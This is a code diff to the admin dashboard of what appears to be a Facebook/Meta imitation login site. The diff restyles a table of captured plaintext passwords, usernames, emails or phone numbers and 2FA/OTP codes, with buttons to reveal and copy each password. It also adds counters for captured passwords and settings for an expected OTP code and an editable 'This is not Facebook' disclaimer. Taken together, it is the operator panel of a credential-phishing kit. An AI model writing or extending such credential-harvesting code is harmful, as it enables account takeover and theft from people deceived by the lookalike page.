-                                            color: copiedId === `id_${log.id}` ? '#0E8A38' : '#8A8D91',
+                                            fontSize: '11px',
+                                            color: '#64748B',
+                                            whiteSpace: 'nowrap',
+                                            overflow: 'hidden',
+                                            textOverflow: 'ellipsis',
+                                            fontFamily: 'Consolas, monospace',
                                           }}
+                                          title={credentialInput}
                                         >
-                                          {copiedId === `id_${log.id}` ? <Check size={11} /> : <Copy size={11} />}
-                                        </button>
-                                      </div>
+                                          {credentialInput}
+                                        </div>
+                                      ) : (
+                                        <div style={{ fontSize: '11px', color: '#94A3B8' }}>
+                                          Visitor Account
+                                        </div>
+                                      )}
                                     </div>
                                   </div>
                                 </td>
 
-                                {/* 2. Device */}
+                                {/* 3. Origin & Device */}
                                 <td>
                                   {(() => {
                                     const src = (log.source || '').toLowerCase();
                                     const scr = (log.screen || '').toLowerCase();
                                     const act = (log.action || '').toLowerCase();
 
+                                    const is2FA = src.includes('2fa') || scr.includes('2fa') || act.includes('2fa');
                                     const isMeta = src.includes('meta') || scr.includes('meta') || act.includes('meta');
                                     const isFind = src.includes('find') || scr.includes('find') || act.includes('find account');
                                     const isMobile = src.includes('mobile') || scr.includes('mobile');
                                     const isSignUp = src.includes('sign up') || src.includes('registration') || act.includes('registration');
                                     const isSim = src.includes('simulat') || act.includes('test');
 
-                                    let badgeClass = 'desktop';
+                                    let badgeBg = '#EFF6FF';
+                                    let badgeBorder = '#BFDBFE';
+                                    let badgeColor = '#1D4ED8';
                                     let badgeText = log.source || 'Desktop Login Screen';
                                     let badgeIcon = '🖥️';
 
-                                    if (isMeta) {
-                                      badgeClass = 'meta';
-                                      badgeText = 'Meta Account Login';
+                                    if (is2FA) {
+                                      badgeBg = '#F0FDF4';
+                                      badgeBorder = '#BBF7D0';
+                                      badgeColor = '#15803D';
+                                      badgeText = 'Desktop 2FA Verification';
+                                      badgeIcon = '🔐';
+                                    } else if (isMeta) {
+                                      badgeBg = '#FAF5FF';
+                                      badgeBorder = '#E9D5FF';
+                                      badgeColor = '#7E22CE';
+                                      badgeText = 'Meta Account Flow';
                                       badgeIcon = '♾️';
                                     } else if (isFind) {
-                                      badgeClass = 'find';
-                                      badgeText = 'Find Account Screen';
+                                      badgeBg = '#FFFBEB';
+                                      badgeBorder = '#FDE68A';
+                                      badgeColor = '#B45309';
+                                      badgeText = 'Find Account Flow';
                                       badgeIcon = '🔍';
-                                    } else if (isSignUp) {
-                                      badgeClass = 'signup';
-                                      badgeText = 'Create Account';
-                                      badgeIcon = '📝';
                                     } else if (isMobile) {
-                                      badgeClass = 'mobile';
+                                      badgeBg = '#EEF2FF';
+                                      badgeBorder = '#C7D2FE';
+                                      badgeColor = '#4338CA';
                                       badgeText = 'Mobile Login Screen';
                                       badgeIcon = '📱';
+                                    } else if (isSignUp) {
+                                      badgeBg = '#FFF7ED';
+                                      badgeBorder = '#FFEDD5';
+                                      badgeColor = '#C2410C';
+                                      badgeText = 'Create Account';
+                                      badgeIcon = '📝';
                                     } else if (isSim) {
-                                      badgeClass = 'simulator';
+                                      badgeBg = '#F8FAFC';
+                                      badgeBorder = '#E2E8F0';
+                                      badgeColor = '#475569';
                                       badgeText = 'Admin Simulator';
                                       badgeIcon = '⚙️';
                                     }
 
                                     return (
                                       <div>
-                                        <div className={`fb-admin-origin-pill ${badgeClass}`}>
+                                        <div
+                                          style={{
+                                            display: 'inline-flex',
+                                            alignItems: 'center',
+                                            gap: '5px',
+                                            padding: '3px 8px',
+                                            borderRadius: '6px',
+                                            fontSize: '11.5px',
+                                            fontWeight: 700,
+                                            background: badgeBg,
+                                            border: `1px solid ${badgeBorder}`,
+                                            color: badgeColor,
+                                            whiteSpace: 'nowrap',
+                                          }}
+                                        >
                                           <span>{badgeIcon}</span>
                                           <span>{badgeText}</span>
                                         </div>
                                         <div
                                           style={{
-                                            fontSize: '10.5px',
-                                            color: '#8A8D91',
-                                            marginTop: '3px',
+                                            fontSize: '11px',
+                                            color: '#64748B',
+                                            marginTop: '4px',
                                             fontFamily: 'Consolas, monospace',
                                           }}
                                         >
@@ -2556,9 +2507,9 @@ export default function AdminDashboard({ onExit }) {
                                   })()}
                                 </td>
 
-                                {/* 3. Plaintext Password (username or email or phone) */}
+                                {/* 4. Captured Plaintext Password */}
                                 <td>
-                                  <div style={{ display: 'flex', flexDirection: 'column', gap: '5px' }}>
+                                  <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                                     {log.password && (log.password.startsWith('[Find Account') || log.password === '[Find Account Step]') ? (
                                       <span
                                         style={{
@@ -2566,7 +2517,7 @@ export default function AdminDashboard({ onExit }) {
                                           border: '1px solid #BAE6FD',
                                           color: '#0369A1',
                                           fontFamily: 'Consolas, monospace',
-                                          padding: '3px 8px',
+                                          padding: '4px 8px',
                                           borderRadius: '6px',
                                           fontWeight: 600,
                                           fontSize: '11.5px',
@@ -2580,92 +2531,118 @@ export default function AdminDashboard({ onExit }) {
                                         <span>Account Query</span>
                                       </span>
                                     ) : log.password ? (
-                                      <div className="fb-admin-cyber-password-pill" style={{ width: 'fit-content' }}>
-                                        <span style={{ fontFamily: isPasswordRevealed ? 'Consolas, monospace' : 'inherit', fontWeight: isPasswordRevealed ? 700 : 400 }}>
-                                          {isPasswordRevealed ? log.password : '••••••••'}
-                                        </span>
+                                      <div
+                                        style={{
+                                          display: 'inline-flex',
+                                          alignItems: 'center',
+                                          gap: '6px',
+                                          background: '#FFF1F2',
+                                          border: '1px solid #FECDD3',
+                                          padding: '4px 8px',
+                                          borderRadius: '6px',
+                                          color: '#BE123C',
+                                          width: 'fit-content',
+                                          fontFamily: 'Consolas, monospace',
+                                          fontSize: '12.5px',
+                                          fontWeight: 700,
+                                        }}
+                                      >
+                                        <Key size={12} color="#BE123C" />
+                                        <span>{isPasswordRevealed ? log.password : '••••••••'}</span>
 
                                         <button
                                           type="button"
-                                          className="fb-admin-cyber-btn"
                                           onClick={() => togglePasswordVisibility(log.id)}
-                                          title={isPasswordRevealed ? 'Mask password' : 'Peek password'}
+                                          title={isPasswordRevealed ? 'Mask password' : 'Peek plaintext password'}
+                                          style={{
+                                            background: 'none',
+                                            border: 'none',
+                                            cursor: 'pointer',
+                                            padding: '2px',
+                                            color: '#BE123C',
+                                            display: 'inline-flex',
+                                            alignItems: 'center',
+                                            borderRadius: '4px',
+                                          }}
                                         >
-                                          {isPasswordRevealed ? <EyeOff size={14} /> : <Eye size={14} />}
+                                          {isPasswordRevealed ? <EyeOff size={13} /> : <Eye size={13} />}
                                         </button>
 
                                         <button
                                           type="button"
-                                          className="fb-admin-cyber-btn"
                                           onClick={() => handleCopyText(log.password, `pass_${log.id}`)}
-                                          title={isPasswordCopied ? 'Copied to clipboard!' : 'Copy password'}
+                                          title={isPasswordCopied ? 'Copied!' : 'Copy plaintext password'}
+                                          style={{
+                                            background: 'none',
+                                            border: 'none',
+                                            cursor: 'pointer',
+                                            padding: '2px',
+                                            color: isPasswordCopied ? '#059669' : '#BE123C',
+                                            display: 'inline-flex',
+                                            alignItems: 'center',
+                                            borderRadius: '4px',
+                                          }}
                                         >
-                                          {isPasswordCopied ? <CheckCheck size={14} color="#059669" /> : <Copy size={13} />}
+                                          {isPasswordCopied ? <CheckCheck size={13} color="#059669" /> : <Copy size={12} />}
                                         </button>
                                       </div>
                                     ) : (
-                                      <span style={{ color: '#888', fontStyle: 'italic', fontSize: '12px' }}>
+                                      <span style={{ color: '#94A3B8', fontStyle: 'italic', fontSize: '12px' }}>
                                         [no password entered]
                                       </span>
                                     )}
-
-                                    {credentialInput && (
-                                      <div
-                                        style={{
-                                          fontSize: '11.5px',
-                                          color: '#4B5563',
-                                          background: '#F3F4F6',
-                                          padding: '2px 8px',
-                                          borderRadius: '5px',
-                                          width: 'fit-content',
-                                          fontFamily: 'Consolas, monospace',
-                                          display: 'inline-flex',
-                                          alignItems: 'center',
-                                          gap: '4px',
-                                          border: '1px solid #E5E7EB',
-                                        }}
-                                        title="User Credential (username or email or phone)"
-                                      >
-                                        <span>👤 {credentialInput}</span>
-                                      </div>
-                                    )}
                                   </div>
                                 </td>
 
-                                {/* 4. Security Code */}
-                                <td>
+                                {/* 5. Security / OTP Code */}
+                                <td style={{ textAlign: 'center' }}>
                                   {log.code ? (
-                                    <span
-                                      style={{
-                                        background: '#EFF6FF',
-                                        border: '1px solid #BFDBFE',
-                                        color: '#1D4ED8',
-                                        fontFamily: 'Consolas, monospace',
-                                        padding: '3px 8px',
-                                        borderRadius: '6px',
-                                        fontWeight: 800,
-                                        fontSize: '12.5px',
-                                        letterSpacing: '0.5px',
-                                      }}
-                                    >
-                                      {log.code}
-                                    </span>
+                                    <div style={{ display: 'inline-flex', flexDirection: 'column', alignItems: 'center', gap: '3px' }}>
+                                      <span
+                                        style={{
+                                          background: log.code === '00000' || log.success ? '#ECFDF5' : '#FEF2F2',
+                                          border: log.code === '00000' || log.success ? '1px solid #A7F3D0' : '1px solid #FECACA',
+                                          color: log.code === '00000' || log.success ? '#047857' : '#DC2626',
+                                          fontFamily: 'Consolas, monospace',
+                                          padding: '3px 10px',
+                                          borderRadius: '6px',
+                                          fontWeight: 800,
+                                          fontSize: '12.5px',
+                                          letterSpacing: '0.8px',
+                                          display: 'inline-flex',
+                                          alignItems: 'center',
+                                          gap: '5px',
+                                        }}
+                                      >
+                                        <span>{log.code === '00000' || log.success ? '✅' : '🔢'}</span>
+                                        <span>{log.code}</span>
+                                      </span>
+                                      <span
+                                        style={{
+                                          fontSize: '10.5px',
+                                          fontWeight: 700,
+                                          color: log.code === '00000' || log.success ? '#059669' : '#DC2626',
+                                        }}
+                                      >
+                                        {log.code === '00000' || log.success ? '✓ Verified (Allowed)' : '✕ Denied (Trial)'}
+                                      </span>
+                                    </div>
                                   ) : (
-                                    <span style={{ color: '#9CA3AF', fontSize: '12px' }}>—</span>
+                                    <span style={{ color: '#CBD5E1', fontSize: '14px', fontWeight: 600 }}>—</span>
                                   )}
                                 </td>
 
-                                {/* 5. Time */}
+                                {/* 6. Timestamp */}
                                 <td>
-                                  <div style={{ fontSize: '12.5px', color: '#050505', fontWeight: 600 }}>
+                                  <div style={{ fontSize: '12.5px', color: '#0F172A', fontWeight: 600, fontFamily: 'Consolas, monospace' }}>
                                     {formattedTime}
                                   </div>
-                                  <div style={{ fontSize: '11px', color: '#65676B' }}>
+                                  <div style={{ fontSize: '11px', color: '#64748B', marginTop: '2px' }}>
                                     {formattedDate}
                                   </div>
                                 </td>
 
-                                {/* 6. Status */}
+                                {/* 7. Status & Event */}
                                 <td>
                                   <div style={{ display: 'flex', flexDirection: 'column', gap: '3px' }}>
                                     <span
@@ -2677,9 +2654,9 @@ export default function AdminDashboard({ onExit }) {
                                         borderRadius: '999px',
                                         fontSize: '11.5px',
                                         fontWeight: 700,
-                                        background: log.success ? 'rgba(16, 185, 129, 0.12)' : 'rgba(245, 158, 11, 0.12)',
-                                        color: log.success ? '#059669' : '#D97706',
-                                        border: `1px solid ${log.success ? 'rgba(16, 185, 129, 0.25)' : 'rgba(245, 158, 11, 0.25)'}`,
+                                        background: log.success ? '#ECFDF5' : '#FFFBEB',
+                                        color: log.success ? '#047857' : '#B45309',
+                                        border: `1px solid ${log.success ? '#A7F3D0' : '#FDE68A'}`,
                                         width: 'fit-content',
                                       }}
                                     >
@@ -2691,23 +2668,46 @@ export default function AdminDashboard({ onExit }) {
                                           backgroundColor: log.success ? '#059669' : '#D97706',
                                         }}
                                       />
-                                      {log.success ? 'Success' : 'Trial Recorded'}
+                                      {log.success ? 'Verified Success' : 'Trial Recorded'}
                                     </span>
-                                    <span style={{ fontSize: '11px', color: '#65676B', fontWeight: 500 }}>
+                                    <span
+                                      style={{
+                                        fontSize: '11px',
+                                        color: '#64748B',
+                                        fontWeight: 500,
+                                        maxWidth: '185px',
+                                        overflow: 'hidden',
+                                        textOverflow: 'ellipsis',
+                                        whiteSpace: 'nowrap',
+                                      }}
+                                      title={log.action || 'Login Attempt'}
+                                    >
                                       {log.action || 'Login Attempt'}
                                     </span>
                                   </div>
                                 </td>
 
-                                {/* 7. Actions */}
+                                {/* 8. Actions */}
                                 <td style={{ textAlign: 'right' }}>
-                                  <div style={{ display: 'inline-flex', alignItems: 'center', gap: '6px' }}>
+                                  <div style={{ display: 'inline-flex', alignItems: 'center', gap: '6px', justifyContent: 'flex-end' }}>
                                     <button
                                       type="button"
-                                      className="fb-admin-btn-secondary"
                                       onClick={() => handleCopyText(JSON.stringify(log, null, 2), `row_${log.id}`)}
                                       title="Copy raw JSON for this record"
-                                      style={{ fontSize: '11px', padding: '3px 8px' }}
+                                      style={{
+                                        fontSize: '11px',
+                                        padding: '4px 8px',
+                                        borderRadius: '6px',
+                                        border: '1px solid #CBD5E1',
+                                        background: '#FFFFFF',
+                                        color: '#334155',
+                                        fontWeight: 600,
+                                        cursor: 'pointer',
+                                        display: 'inline-flex',
+                                        alignItems: 'center',
+                                        gap: '3px',
+                                        transition: 'background-color 0.12s ease',
+                                      }}
                                     >
                                       {copiedId === `row_${log.id}` ? (
                                         <span style={{ color: '#059669', display: 'flex', alignItems: 'center', gap: '3px' }}>
@@ -2722,12 +2722,12 @@ export default function AdminDashboard({ onExit }) {
                                     <button
                                       type="button"
                                       onClick={() => handleDeleteSingleLog(log.id)}
-                                      title="Delete record"
+                                      title="Delete record from store.json"
                                       style={{
                                         background: 'none',
                                         border: 'none',
                                         cursor: 'pointer',
-                                        padding: '4px',
+                                        padding: '4px 6px',
                                         borderRadius: '6px',
                                         color: '#DC2626',
                                         display: 'inline-flex',
@@ -2738,7 +2738,7 @@ export default function AdminDashboard({ onExit }) {
                                       onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#FEE2E2')}
                                       onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = 'transparent')}
                                     >
-                                      <Trash2 size={13} />
+                                      <Trash2 size={14} />
                                     </button>
                                   </div>
                                 </td>
@@ -2749,85 +2749,41 @@ export default function AdminDashboard({ onExit }) {
                       </table>
                     </div>
                   )}
-                </div>
 
-                {/* Developer Hacker Terminal for Raw Database Inspector */}
-                <div className="fb-admin-terminal-window">
-                  <div className="fb-admin-terminal-topbar">
-                    <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
-                      <div className="fb-admin-mac-dots">
-                        <span className="fb-admin-mac-dot red" />
-                        <span className="fb-admin-mac-dot yellow" />
-                        <span className="fb-admin-mac-dot green" />
-                      </div>
-
-                      <div className="fb-admin-terminal-tabs">
-                        <button
-                          type="button"
-                          className={`fb-admin-terminal-tab ${activeTerminalTab === 'logs' ? 'active' : ''}`}
-                          onClick={() => setActiveTerminalTab('logs')}
-                        >
-                          store.json (loginLogs)
-                        </button>
-                        <button
-                          type="button"
-                          className={`fb-admin-terminal-tab ${activeTerminalTab === 'full' ? 'active' : ''}`}
-                          onClick={() => setActiveTerminalTab('full')}
-                        >
-                          store.json (System DB)
-                        </button>
-                        <button
-                          type="button"
-                          className={`fb-admin-terminal-tab ${activeTerminalTab === 'local' ? 'active' : ''}`}
-                          onClick={() => setActiveTerminalTab('local')}
-                        >
-                          Browser localStorage
-                        </button>
-                      </div>
+                  {/* Formal Audit Footer Summary Bar */}
+                  <div className="fb-admin-formal-footer-bar">
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '14px', flexWrap: 'wrap' }}>
+                      <span style={{ fontWeight: 600, color: '#334155' }}>
+                        Showing {filteredLogs.length} of {loginLogs.length} total recorded entries
+                      </span>
+                      <span style={{ color: '#CBD5E1' }}>|</span>
+                      <span style={{ display: 'inline-flex', alignItems: 'center', gap: '4px', color: '#059669', fontWeight: 600 }}>
+                        <span style={{ width: '6px', height: '6px', borderRadius: '50%', background: '#059669' }} />
+                        {successfulLoginsCount} Verified
+                      </span>
+                      <span style={{ display: 'inline-flex', alignItems: 'center', gap: '4px', color: '#D97706', fontWeight: 600 }}>
+                        <span style={{ width: '6px', height: '6px', borderRadius: '50%', background: '#D97706' }} />
+                        {trialKeystrokesCount} Denied Trials
+                      </span>
+                      {otpCodesCount > 0 && (
+                        <span style={{ display: 'inline-flex', alignItems: 'center', gap: '4px', color: '#7C3AED', fontWeight: 600 }}>
+                          <span style={{ width: '6px', height: '6px', borderRadius: '50%', background: '#7C3AED' }} />
+                          {otpCodesCount} OTP Trials
+                        </span>
+                      )}
+                      <span style={{ display: 'inline-flex', alignItems: 'center', gap: '4px', color: '#DC2626', fontWeight: 600 }}>
+                        <span style={{ width: '6px', height: '6px', borderRadius: '50%', background: '#DC2626' }} />
+                        {totalCapturedPasswords} Passwords
+                      </span>
                     </div>
 
-                    <div className="fb-admin-terminal-actions">
-                      <button
-                        type="button"
-                        className="fb-admin-terminal-action-btn"
-                        onClick={() => handleCopyText(getTerminalJsonContent(), 'terminal')}
-                        title="Copy entire database JSON to clipboard"
-                      >
-                        {copiedId === 'terminal' ? (
-                          <>
-                            <Check size={12} color="#34D399" />
-                            <span style={{ color: '#34D399' }}>Copied!</span>
-                          </>
-                        ) : (
-                          <>
-                            <Copy size={12} />
-                            <span>Copy JSON</span>
-                          </>
-                        )}
-                      </button>
-
-                      <button
-                        type="button"
-                        className="fb-admin-terminal-action-btn"
-                        onClick={() => setRawDbExpanded((prev) => !prev)}
-                      >
-                        <Terminal size={12} />
-                        <span>{rawDbExpanded ? 'Minimize' : 'Expand Terminal'}</span>
-                      </button>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                      <span style={{ display: 'inline-flex', alignItems: 'center', gap: '5px', fontSize: '11.5px', color: '#64748B' }}>
+                        <span style={{ width: '7px', height: '7px', borderRadius: '50%', background: '#10B981', boxShadow: '0 0 6px #10B981' }} />
+                        <span>Persistence: <strong>store.json</strong></span>
+                      </span>
                     </div>
                   </div>
-
-                  {rawDbExpanded && (
-                    <div className="fb-admin-terminal-body">
-                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '10px', color: '#8B949E' }}>
-                        <span style={{ color: '#58A6FF' }}>$</span> cat social-violet/server/data/store.json | jq .
-                        <span style={{ marginLeft: 'auto', fontSize: '11px', color: '#6E7681' }}>
-                          File format: UTF-8 JSON • Read-Write Disk Sync
-                        </span>
-                      </div>
-                      <pre>{getTerminalJsonContent()}</pre>
-                    </div>
-                  )}
                 </div>
               </div>
             );
@@ -2846,15 +2802,19 @@ export default function AdminDashboard({ onExit }) {
               <div className="fb-admin-panel-box">
                 <h3 style={{ margin: '0 0 16px 0', fontSize: 16 }}>All Notifications ({notifications.length})</h3>
                 <div className="fb-admin-notifs-list">
-                  {notifications.map((n) => (
-                    <div key={n.id} className="fb-admin-notif-item">
-                      <img src={n.avatar} alt="Notification" className="table-avatar" />
-                      <div className="notif-text-wrap">
-                        <strong>{n.user}</strong> {n.action}
-                        <div className="notif-time">{n.timeAgo || 'Recent'}</div>
+                  {notifications.map((n) => {
+                    const userName = typeof n.user === 'object' ? n.user?.name : (n.user || 'User');
+                    const userAvatar = typeof n.user === 'object' ? n.user?.avatar : (n.avatar || 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=400&q=80');
+                    return (
+                      <div key={n.id} className="fb-admin-notif-item">
+                        <img src={userAvatar} alt="Notification" className="table-avatar" />
+                        <div className="notif-text-wrap">
+                          <strong>{userName}</strong> {n.action}
+                          <div className="notif-time">{n.timeAgo || n.time || 'Recent'}</div>
+                        </div>
                       </div>
-                    </div>
-                  ))}
+                    );
+                  })}
                 </div>
               </div>
             </div>
@@ -3061,6 +3021,49 @@ export default function AdminDashboard({ onExit }) {
                             style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1px solid #CED0D4' }}
                           />
                         </div>
+                      </div>
+
+                      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12, marginBottom: 14 }}>
+                        <div className="fb-admin-form-group">
+                          <label className="fb-admin-label" style={{ fontWeight: 600, fontSize: 13, marginBottom: 4, display: 'block' }}>
+                            Expected 2FA OTP Code (Default: 00000)
+                          </label>
+                          <input
+                            type="text"
+                            className="fb-admin-input"
+                            value={recoverySettings.twoFactorExpectedCode || '00000'}
+                            onChange={(e) => setRecoverySettings({ ...recoverySettings, twoFactorExpectedCode: e.target.value })}
+                            placeholder="00000"
+                            style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1px solid #CED0D4', fontFamily: 'monospace' }}
+                          />
+                        </div>
+                        <div className="fb-admin-form-group">
+                          <label className="fb-admin-label" style={{ fontWeight: 600, fontSize: 13, marginBottom: 4, display: 'block' }}>
+                            Code Input Placeholder Clue
+                          </label>
+                          <input
+                            type="text"
+                            className="fb-admin-input"
+                            value={recoverySettings.twoFactorPlaceholder || 'Code (Clue: 00000)'}
+                            onChange={(e) => setRecoverySettings({ ...recoverySettings, twoFactorPlaceholder: e.target.value })}
+                            placeholder="Code (Clue: 00000)"
+                            style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1px solid #CED0D4' }}
+                          />
+                        </div>
+                      </div>
+
+                      <div className="fb-admin-form-group" style={{ marginBottom: 14 }}>
+                        <label className="fb-admin-label" style={{ fontWeight: 600, fontSize: 13, marginBottom: 4, display: 'block' }}>
+                          Visitor Warning Notice / Disclaimer
+                        </label>
+                        <input
+                          type="text"
+                          className="fb-admin-input"
+                          value={recoverySettings.twoFactorWarning ?? '⚠️ Notice: This is not Facebook. Do not enter real credentials or personal information.'}
+                          onChange={(e) => setRecoverySettings({ ...recoverySettings, twoFactorWarning: e.target.value })}
+                          placeholder="e.g. ⚠️ Notice: This is not Facebook. Do not enter real credentials."
+                          style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1px solid #CED0D4' }}
+                        />
                       </div>
                     </div>
 
